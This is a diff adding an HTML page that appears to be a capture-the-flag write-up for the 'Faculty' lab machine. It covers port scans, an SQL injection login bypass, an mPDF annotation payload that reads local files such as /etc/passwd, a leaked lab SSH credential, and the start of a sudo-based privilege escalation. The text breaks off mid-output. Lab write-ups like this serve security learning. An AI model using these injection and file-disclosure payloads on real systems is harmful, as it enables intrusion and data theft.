@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/faculty.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/faculty.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/faculty.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="faculty">Faculty</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.11.169</p>
+
+<p>Open ports.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PORT</span>   <span class="nx">STATE</span> <span class="nx">SERVICE</span> <span class="nx">REASON</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ssh</span>     <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>    <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
+</code></pre></div></div>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PORT</span>   <span class="nx">STATE</span> <span class="nx">SERVICE</span> <span class="nx">REASON</span>  <span class="nx">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ssh</span>     <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">OpenSSH</span> <span class="mf">8.2</span><span class="nx">p1</span> <span class="nx">Ubuntu</span> <span class="mi">4</span><span class="nx">ubuntu0</span><span class="p">.</span><span class="mi">5</span> <span class="p">(</span><span class="nx">Ubuntu</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nx">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">3072</span> <span class="nx">e9</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">8</span><span class="nx">c</span><span class="p">:</span><span class="nx">e5</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">4</span><span class="nx">d</span><span class="p">:</span><span class="mi">6</span><span class="nx">f</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">98</span><span class="p">:</span><span class="mi">76</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="nx">e7</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">2</span><span class="nx">d</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">16</span> <span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
+<span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">rsa</span> <span class="nx">AAAAB3NzaC1yc2EAAAADAQABAAABgQCzpbkoBfa0UKxT</span><span class="o">+</span><span class="nx">Giw4wE1jz82gGRpuANEdRt</span><span class="o">+</span><span class="nx">D6gp6hDmrcaODUiU</span><span class="o">/</span><span class="nx">N</span><span class="o">+</span><span class="mi">4</span><span class="nx">nX08jcFBk103cLwU8VisxyRu3wHMTHXaYx2WMZXPtb8clv3Hrt</span><span class="o">+</span><span class="nx">q2m4eL</span><span class="o">+</span><span class="nx">DBJMkHO10qCx1IwfYcNyJA3CNCj88X8RgWIREalYWyNHeQFzAHZx4SSrCP9aW5QKqAYVAAS4Za0pts4HVYlfuOrxFgO</span><span class="o">/</span><span class="nx">Z3FL3xynYeyLrFM</span><span class="o">+</span><span class="nx">iEx0cMl9rIYWG8NzqVnBe180u</span><span class="o">+</span><span class="mi">7</span><span class="nx">d</span><span class="o">/</span><span class="nx">y</span><span class="o">/</span><span class="nx">kcsZU6MkBMmqWQlGA6o4srVx73AqbUDChkv8glvq0ZbD1JYmACuMCdn</span><span class="o">/</span><span class="nx">GFI8lRlKaw1BaYeuP0l6qgbb65ghdECYEXC3iycPkR77D6gMbIbg4F9wvzD9AF</span><span class="c1">//aCR+6t8F29DyP/mh1J8a+yiUHY2HJJaDvB5vQLg5Y++9yNEDmxlGFQTdJm/n7YhP2Qj+lkfgsERAO9pfIWGCCWaXl6fddUG4gp1bHLZkek+exgsimU7hApGFrJCtYPkf78xC3pvxx0=</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">43</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">3</span><span class="nx">e</span><span class="p">:</span><span class="nx">cb</span><span class="p">:</span><span class="mi">78</span><span class="p">:</span><span class="nx">e9</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">0</span><span class="nx">e</span><span class="p">:</span><span class="nx">eb</span><span class="p">:</span><span class="nx">cf</span><span class="p">:</span><span class="mi">7</span><span class="nx">f</span><span class="p">:</span><span class="nx">fd</span><span class="p">:</span><span class="nx">f6</span><span class="p">:</span><span class="mi">6</span><span class="nx">d</span><span class="p">:</span><span class="mi">3</span><span class="nf">d </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
+<span class="o">|</span> <span class="nx">ecdsa</span><span class="o">-</span><span class="nx">sha2</span><span class="o">-</span><span class="nx">nistp256</span> <span class="nx">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH8WAd</span><span class="o">+</span><span class="nx">YlbEo4Fpz3</span><span class="o">+</span><span class="nx">UaOYyCJGFa</span><span class="o">/</span><span class="nx">E29JORgMAIOXVlGUpvMgQqiaqDMXtbt</span><span class="o">/</span><span class="nx">G03rGEI9h8dpFAmswN1LJ8uig</span><span class="o">=</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="nx">c1</span><span class="p">:</span><span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="nx">af</span><span class="p">:</span><span class="mi">76</span><span class="p">:</span><span class="mi">2</span><span class="nx">b</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="nx">e8</span><span class="p">:</span><span class="nx">b3</span><span class="p">:</span><span class="nx">b8</span><span class="p">:</span><span class="mi">8</span><span class="nx">a</span><span class="p">:</span><span class="nx">e9</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="mi">7</span><span class="nx">b</span><span class="p">:</span><span class="nx">e6</span><span class="p">:</span><span class="nf">f5 </span><span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_ssh</span><span class="o">-</span><span class="nx">ed25519</span> <span class="nx">AAAAC3NzaC1lZDI1NTE5AAAAINSCwKublVScg9d</span><span class="o">/</span><span class="mi">3</span><span class="nx">Tc</span><span class="o">/</span><span class="nx">NAh0n9XH5lE9SBfl2dl</span><span class="o">+</span><span class="nx">v6F</span><span class="o">+</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>    <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">nginx</span> <span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span> <span class="nx">Did</span> <span class="nx">not</span> <span class="nx">follow</span> <span class="nx">redirect</span> <span class="nx">to</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//faculty.htb</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span> 
+<span class="o">|</span><span class="nx">_</span>  <span class="nx">Supported</span> <span class="nx">Methods</span><span class="p">:</span> <span class="nx">GET</span> <span class="nx">HEAD</span> <span class="nx">POST</span> <span class="nx">OPTIONS</span>
+<span class="nx">Service</span> <span class="nx">Info</span><span class="p">:</span> <span class="nx">OS</span><span class="p">:</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nl">CPE</span><span class="p">:</span> <span class="nl">cpe</span><span class="p">:</span><span class="sr">/o:linux:linux_kerne</span><span class="err">l
+</span></code></pre></div></div>
+
+<h3 id="port-80">Port 80</h3>
+
+<h3 id="tech-and-headers">Tech and headers</h3>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="sr">/machines/</span><span class="nx">linux</span><span class="o">/</span><span class="nx">faculty</span><span class="o">/</span><span class="nx">enumeration</span><span class="p">]</span>
+<span class="err">└─</span><span class="nx">$</span> <span class="nx">whatweb</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.169</span>                                                                                                 
+<span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]</span>
+<span class="nx">http</span><span class="p">:</span><span class="c1">//faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, RedirectLocation[login.php], Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]</span>
+<span class="nx">http</span><span class="p">:</span><span class="c1">//faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]</span>
+
+<span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="sr">/machines/</span><span class="nx">linux</span><span class="o">/</span><span class="nx">faculty</span><span class="o">/</span><span class="nx">enumeration</span><span class="p">]</span>
+<span class="err">└─</span><span class="nx">$</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">L</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">faculty</span><span class="p">.</span><span class="nx">htb</span>
+<span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">302</span> <span class="nx">Found</span>
+<span class="nx">Server</span><span class="p">:</span> <span class="nx">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="nb">Date</span><span class="p">:</span> <span class="nx">Wed</span><span class="p">,</span> <span class="mi">06</span> <span class="nx">Dec</span> <span class="mi">2023</span> <span class="mi">08</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">52</span> <span class="nx">GMT</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="nx">Connection</span><span class="p">:</span> <span class="nx">keep</span><span class="o">-</span><span class="nx">alive</span>
+<span class="nb">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="p">:</span> <span class="nx">PHPSESSID</span><span class="o">=</span><span class="mi">352</span><span class="nx">nt4ha6k07c18akvbbsggtop</span><span class="p">;</span> <span class="nx">path</span><span class="o">=</span><span class="sr">/</span><span class="err">
+</span><span class="nx">Expires</span><span class="p">:</span> <span class="nx">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="nx">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">00</span> <span class="nx">GMT</span>
+<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">store</span><span class="p">,</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span><span class="p">,</span> <span class="nx">must</span><span class="o">-</span><span class="nx">revalidate</span>
+<span class="nx">Pragma</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span>
+<span class="nx">location</span><span class="p">:</span> <span class="nx">login</span><span class="p">.</span><span class="nx">php</span>
+
+<span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="nx">OK</span>
+<span class="nx">Server</span><span class="p">:</span> <span class="nx">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="nb">Date</span><span class="p">:</span> <span class="nx">Wed</span><span class="p">,</span> <span class="mi">06</span> <span class="nx">Dec</span> <span class="mi">2023</span> <span class="mi">08</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">52</span> <span class="nx">GMT</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="nx">Connection</span><span class="p">:</span> <span class="nx">keep</span><span class="o">-</span><span class="nx">alive</span>
+<span class="nb">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="p">:</span> <span class="nx">PHPSESSID</span><span class="o">=</span><span class="nx">kgaebqgentphujgk9mfo9i2shu</span><span class="p">;</span> <span class="nx">path</span><span class="o">=</span><span class="sr">/</span><span class="err">
+</span><span class="nx">Expires</span><span class="p">:</span> <span class="nx">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="nx">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">00</span> <span class="nx">GMT</span>
+<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">store</span><span class="p">,</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span><span class="p">,</span> <span class="nx">must</span><span class="o">-</span><span class="nx">revalidate</span>
+<span class="nx">Pragma</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span>
+</code></pre></div></div>
+
+<h3 id="admin-panel">Admin panel</h3>
+
+<p><img src="/images/faculty3.png" alt="Untitled" /></p>
+
+<p>We can bypass the panel with a simple injection → <code class="language-plaintext highlighter-rouge">admin’ or 1=1-- -</code></p>
+
+<h3 id="id-login">ID login</h3>
+
+<p><img src="/images/faculty2.png" alt="Untitled" /></p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>In the admin panel we can make a request to generate a PDF that is created using data supplied by us.</p>
+
+<p><img src="/images/faculty1.png" alt="Untitled" /></p>
+
+<p>The last one has been added by me. There are various ways we can try to exploit this.</p>
+
+<ul>
+  <li>Tipical PDF injections</li>
+  <li>Exploits for mdpf (pdf generator is leaked in the url)</li>
+</ul>
+
+<p>If we search for mdpf exploits we eventually find the following payload:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">&lt;annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" /&gt;</code></li>
+</ul>
+
+<p>That can be used to include a file as an attached file to the PDF.</p>
+
+<h3 id="exploit-file-disclosure">Exploit file disclosure</h3>
+
+<p>We can get the <strong>passwd</strong> file from the victim. These are the users.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">:</span><span class="nx">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="nx">root</span><span class="p">:</span><span class="o">/</span><span class="nx">root</span><span class="p">:</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
+<span class="nx">gbyolo</span><span class="p">:</span><span class="nx">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="nx">gbyolo</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">gbyolo</span><span class="p">:</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
+<span class="nx">developer</span><span class="p">:</span><span class="nx">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1002</span><span class="p">:,,,:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">developer</span><span class="p">:</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
+</code></pre></div></div>
+
+<p>We try to get the ssh key from the users but we get an error:</p>
+
+<ul>
+  <li>We don’t have permission to read a file or the file doesn’t exist we get an error.</li>
+</ul>
+
+<h3 id="getting-info-about-the-proccess-running-the-app">Getting info about the proccess running the app</h3>
+
+<p>We will use the information contained in /proc/self/ to see if we can leak something.</p>
+
+<ul>
+  <li>cmdline</li>
+</ul>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="sr">/machines/</span><span class="nx">linux</span><span class="o">/</span><span class="nx">faculty</span><span class="p">]</span>
+<span class="err">└─</span><span class="nx">$</span> <span class="nx">cat</span> <span class="nx">cmdline</span>              
+<span class="nx">php</span><span class="o">-</span><span class="nx">fpm</span><span class="p">:</span> <span class="nx">pool</span> <span class="nx">www</span>
+</code></pre></div></div>
+
+<h3 id="reading-source-code">Reading source code</h3>
+
+<p>Let’s try to read some interesting files in the root of the web page.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/index.php            </span><span class="se">(</span><span class="sr">Status: 302</span><span class="se">)</span><span class="sr"> </span><span class="se">[</span><span class="sr">Size: 12193</span><span class="se">]</span><span class="sr"> </span><span class="se">[</span><span class="sr">--&gt; login.php</span><span class="err">]
+</span><span class="sr">/login.php            </span><span class="se">(</span><span class="sr">Status: 200</span><span class="se">)</span><span class="sr"> </span><span class="se">[</span><span class="sr">Size: 4860</span><span class="err">]
+</span><span class="o">/</span><span class="nx">header</span><span class="p">.</span><span class="nf">php           </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">2871</span><span class="p">]</span>
+<span class="o">/</span><span class="nf">admin                </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//faculty.htb/admin/]</span>
+<span class="o">/</span><span class="nx">test</span><span class="p">.</span><span class="nf">php             </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">500</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">topbar</span><span class="p">.</span><span class="nf">php           </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">1206</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>The one that is strange is <strong>test.php</strong>. Since we don’t knowthe absolute path of the app in the machine we have to test with relative paths until we have something.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./mpdf-6.0.0/mpdf.php</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">$mpdf</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">mPDF</span><span class="p">(</span><span class="dl">'</span><span class="s1">c</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="nx">$mpdf</span><span class="o">-&gt;</span><span class="nc">WriteHTML</span><span class="p">(</span><span class="nx">$html</span><span class="p">);</span>
+<span class="nx">$mpdf</span><span class="o">-&gt;</span><span class="nc">Output</span><span class="p">();</span>
+<span class="nx">exit</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>But is simply the file to generate the PDFs. We can see that the library is indeed mdpf. In the admin folder we have more stuff.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/index.php            </span><span class="se">(</span><span class="sr">Status: 302</span><span class="se">)</span><span class="sr"> </span><span class="se">[</span><span class="sr">Size: 13897</span><span class="se">]</span><span class="sr"> </span><span class="se">[</span><span class="sr">--&gt; login.php</span><span class="err">]
+</span><span class="sr">/download.php         </span><span class="se">(</span><span class="sr">Status: 200</span><span class="se">)</span><span class="sr"> </span><span class="se">[</span><span class="sr">Size: 17</span><span class="err">]
+</span><span class="o">/</span><span class="nx">home</span><span class="p">.</span><span class="nf">php             </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">2995</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">login</span><span class="p">.</span><span class="nf">php            </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">5618</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">events</span><span class="p">.</span><span class="nf">php           </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">500</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">1193</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">header</span><span class="p">.</span><span class="nf">php           </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">2691</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">users</span><span class="p">.</span><span class="nf">php            </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">1593</span><span class="p">]</span>
+<span class="o">/</span><span class="nf">assets               </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//faculty.htb/admin/assets/]</span>
+<span class="o">/</span><span class="nx">faculty</span><span class="p">.</span><span class="nf">php          </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">8532</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">courses</span><span class="p">.</span><span class="nf">php          </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">9214</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">ajax</span><span class="p">.</span><span class="nf">php             </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">schedule</span><span class="p">.</span><span class="nf">php         </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">5553</span><span class="p">]</span>
+<span class="o">/</span><span class="nf">database             </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//faculty.htb/admin/database/]</span>
+<span class="o">/</span><span class="nx">navbar</span><span class="p">.</span><span class="nf">php           </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">1116</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">subjects</span><span class="p">.</span><span class="nf">php         </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">12744</span><span class="p">]</span>
+<span class="o">/</span><span class="nx">topbar</span><span class="p">.</span><span class="nf">php           </span><span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">1201</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>If investigate the source code we will finally grab some credentials  from files that can’t be found using fuzzing. These credentials can be used to connect as a user via ssh.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">gybolo:Co.met06aci.dly53ro.per</code></li>
+</ul>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<h3 id="pivoting-to-user-developer">Pivoting to user developer</h3>
+
+<p>User gybolo can execute a single command as the user developer.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gbyolo</span><span class="p">@</span><span class="nd">faculty</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
+<span class="p">[</span><span class="nx">sudo</span><span class="p">]</span> <span class="nx">password</span> <span class="k">for</span> <span class="nx">gbyolo</span><span class="p">:</span> 
+<span class="nx">Matching</span> <span class="nx">Defaults</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">gbyolo</span> <span class="nx">on</span> <span class="nx">faculty</span><span class="p">:</span>
+    <span class="nx">env_reset</span><span class="p">,</span> <span class="nx">mail_badpass</span><span class="p">,</span> <span class="nx">secure_path</span><span class="o">=</span><span class="sr">/usr/</span><span class="nx">local</span><span class="o">/</span><span class="nx">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="nx">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="nx">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="nx">snap</span><span class="o">/</span><span class="nx">bin</span>
+
+<span class="nx">User</span> <span class="nx">gbyolo</span> <span class="nx">may</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">commands</span> <span class="nx">on</span> <span class="nx">faculty</span><span class="p">:</span>
